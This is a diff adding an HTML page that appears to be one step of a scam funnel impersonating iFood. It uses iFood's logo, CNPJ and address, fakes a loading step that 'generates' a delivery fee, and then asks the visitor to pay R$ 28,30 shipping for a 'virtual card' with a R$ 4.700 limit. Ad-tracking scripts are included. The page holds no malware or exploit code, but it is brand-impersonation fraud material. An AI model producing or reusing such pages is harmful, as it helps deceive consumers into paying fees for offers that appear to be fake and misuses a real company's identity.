@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&amp;display=swap" rel="stylesheet">
+    <title>Detalhes do Envio</title>
+    <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+<script>
+  window.pixelId = "687519d96e183b51aca20836";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <style>
+        body {
+        margin: 0;
+        font-family: 'Inter', sans-serif;
+        background-color: #ffffff;
+        color: #333;
+        text-align: center;
+    }
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+            background-color: #EA1D2C;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+        .header img {
+            width: 120px;
+            height: auto;
+            filter: brightness(0) invert(1);
+        }
+        .logo {
+                    margin-left: auto;
+                    margin-right: auto;
+                }
+        .content {
+            padding: 30px 20px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        .loader-container {
+            text-align: center;
+            padding: 40px;
+        }
+        .loader {
+            border: 2px solid #EA1D2C;
+            border-top: 4px solid #EA1D2C;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% {  }
+            100% {  }
+        }
+        .success-message {
+            background-color: #e8f5e9;
+            border: 2px solid #EA1D2C;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            color: #2e7d32;
+        }
+        .success-message i {
+            margin-right: 10px;
+        }
+        .details-card {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 15px;
+        }
+        .details-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        .details-text {
+            color: #666;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+        .button {
+        background-color: #EA1D2C;
+        color: #ffffff;
+        padding: 18px 30px;
+        border-radius: 12px;
+        font-family: 'Inter', sans-serif;
+        font-weight: 600;
+        font-size: 16px;
+        cursor: pointer;
+        width: 100%;
+        text-decoration: none;
+        display: inline-block;
+        text-align: center;
+        box-sizing: border-box;
+        border: none;
+        transition: all 0.3s ease;
+        box-shadow: 0 4px 12px rgba(234, 29, 44, 0.3);
+    }
+        
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/90/IFood_logo.svg/2560px-IFood_logo.svg.png" alt="Logo iFood" class="logo">
+    </div>
+
+    <div class="content">
+        <div id="loader" class="loader-container" style="border: 1px solid #ddd; border-radius: 8px;">
+            <div class="loader"></div>
+            <p>Gerando a taxa de entrega...</p>
+        </div>
+
+        <div id="shipping-details" style="display: none;">
+            <div class="success-message">
+                <i class="fas fa-check-circle"></i>
+                Taxa de envio gerada com sucesso!
+            </div>
+
+            <div class="details-card">
+                <div class="details-title">Detalhes do Envio</div>
+                <div class="details-text" style="font-weight: bold;">Endereço de entrega:</div>
+                <div class="details-text" id="endereco-entrega"></div>
+                <div class="details-text" id="bairro-cidade"></div>
+                <div class="details-text" id="cep"></div>
+                <script>
+                    const enderecoSalvo = JSON.parse(localStorage.getItem('enderecoEntrega'));
+                    if (enderecoSalvo) {
+                        document.getElementById('endereco-entrega').textContent = `${enderecoSalvo.logradouro}, ${enderecoSalvo.numero} ${enderecoSalvo.complemento ? '- ' + enderecoSalvo.complemento : ''}`;
+                        document.getElementById('bairro-cidade').textContent = `${enderecoSalvo.bairro} - ${enderecoSalvo.cidade}/${enderecoSalvo.estado}`;
+                        document.getElementById('cep').textContent = `CEP: ${enderecoSalvo.cep}`;
+                    }
+                </script>
+            </div>
+
+            <div class="details-card">
+                <div class="details-title">Método de Envio</div>
+                <div class="details-text">SEDEX</div>
+                <div class="details-text">Prazo de entrega: 1 dia útil</div>
+                <div class="details-text">Valor do frete: R$ 28,30</div>
+            </div>
+
+            <a href="#" onclick="window.location.href = buildUrlWithParams('../14-1/index.html'); return false;" class="button"  style="background-color: #EA1D2C; color: #ffffff;">
+                SIM, VOU QUERER!
+            </a>
+
+            <div style="margin-top: 20px;background-color: #e8f5e9; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
+                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 12px;">
+                    <i class="fas fa-credit-card" style="font-size: 20px; color: #1b5e20;"></i>
+                    <div style="font-size: 16px; font-weight: 600; color: #1b5e20;">Cartão Virtual Disponível Hoje</div>
+                </div>
+                <div style="color: #2e7d32; font-size: 16px; line-height: 1.4;">
+                    Você receberá hoje seu cartão virtual com limite de R$ 4.700 para começar a usar imediatamente, enquanto seu cartão físico está a caminho.
+                </div>
+            </div>
+            
+
+            <footer style="padding: 10px 15px; text-align: center; margin-top: 50px; background-color: #f9f9f9; border-top: 1px solid #eaeaea; font-family: 'Inter', sans-serif;">
+                <div style="max-width: 600px; margin: 0 auto;">
+                    <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+                        iFood.com Agência de Restaurantes Online S.A. | CNPJ: 14.380.200/0001-21
+                    </p>
+                    <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+                        Rua Jasmin, 660 - Vila Madalena, São Paulo - SP, 05042-001
+                    </p>
+                    <p style="color: #999; font-size: 9px; margin-top: 5px;">
+                        © 2025 - Todos os direitos reservados
+                    </p>
+                </div>
+            </footer>
+        </div>
+    </div>
+
+    <script>
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location.href);
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            return url.toString();
+        }
+
+        window.onload = function() {
+            setTimeout(function() {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('shipping-details').style.display = 'block';
+
+                const endereco = JSON.parse(localStorage.getItem('enderecoEntrega'));
+                if (endereco) {
+                    document.getElementById('endereco-entrega').textContent = 
+                        `${endereco.logradouro}, ${endereco.numero}` + 
+                        (endereco.complemento ? ` - ${endereco.complemento}` : '');
+                    document.getElementById('bairro-cidade').textContent = 
+                        `${endereco.bairro} - ${endereco.cidade}/${endereco.estado}`;
+                    document.getElementById('cep').textContent = 
+                        `CEP: ${endereco.cep}`;
+                }
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
